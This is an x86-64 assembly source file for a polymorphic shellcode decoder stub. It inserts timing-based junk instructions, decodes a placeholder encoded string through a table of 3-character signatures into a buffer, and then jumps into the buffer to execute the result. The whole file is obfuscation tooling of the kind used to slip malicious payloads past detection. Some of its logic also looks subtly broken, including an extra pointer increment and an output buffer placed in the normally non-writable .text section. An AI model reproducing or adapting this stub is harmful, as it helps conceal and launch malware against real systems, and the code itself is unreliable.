# DECODER_SIG32
# Uses a 32-bit signature table with polymorphic junk
.intel_syntax noprefix
.section .text
.global decoder_entry
# --- PROLOGUE_INSERT ---
decoder_entry:
    rdtsc
    xor eax, edx
    and al, 1
    jz .path_a
    jmp .path_b
.path_a:
    xchg r14, r14
    push r14
    pop r14
    jmp .init
.path_b:
    xor r14, r14
    add r14, 0
.init:
    lea r13, [rip + encoded_data]
    lea r15, [rip + outbuf]
    lea r11, [rip + signatures]

main_loop:
    movzx eax, byte ptr [r13]
    test al, al
    jz finish
    cmp al, ' '
    je skip_sep

    call decode_nibble
    mov bl, al
    shl bl, 4
    inc r13
    call decode_nibble
    or bl, al
    mov byte ptr [r15], bl
    inc r15
    jmp main_loop

skip_sep:
    inc r13
    jmp main_loop

finish:
    lea rax, [rip + outbuf]
    jmp rax

decode_nibble:
    push rbx
    push rcx
    push rdx

    movzx eax, byte ptr [r13]
    movzx ebx, byte ptr [r13+1]
    movzx ecx, byte ptr [r13+2]

    # signature = char0 | (char1<<8) | (char2<<16)
    shl ebx, 8
    shl ecx, 16
    or eax, ebx
    or eax, ecx

    xor edx, edx
.sig_search:
    cmp edx, 16
    jge .nf
    cmp eax, dword ptr [r11 + rdx*4]
    je .found
    inc edx
    jmp .sig_search
.nf:
    xor eax, eax
    jmp .done
.found:
    mov eax, edx
.done:
    add r13, 3
    pop rdx
    pop rcx
    pop rbx
    ret

signatures:
    .long 0x00557755, 0x004F774F, 0x00547754, 0x003C773E
    .long 0x005E775E, 0x00517751, 0x00507750, 0x00527752
    .long 0x00537753, 0x00567756, 0x00587758, 0x00597759
    .long 0x005A775A, 0x004E774E, 0x004D774D, 0x004C774C

encoded_data:
    .asciz "__ENCODED_DATA__"
outbuf:
    .space 4096
